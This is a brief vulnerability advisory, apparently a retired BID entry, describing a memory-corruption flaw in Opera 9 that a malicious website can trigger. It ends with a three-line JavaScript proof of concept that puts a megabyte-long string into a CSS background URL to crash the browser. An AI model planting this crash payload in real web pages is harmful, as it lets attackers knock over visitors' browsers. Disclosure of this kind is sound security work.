Opera Web Browser is prone to a memory-corruption vulnerability.

A remote attacker may trigger this issue by enticing a user to visit a malicious website.

This issue has been reported in Opera 9. Other versions may be vulnerable as well.

This BID has been retired because the vendor reported that this issue is a duplicate of BID 18585 (Opera Malicious HTML Processing Denial of Service Vulnerability).

	var b = 'XXXX';
	while (b.length <= 1024*1024) b+=b;
	a.style.background = 'url(https://' + b + ')';
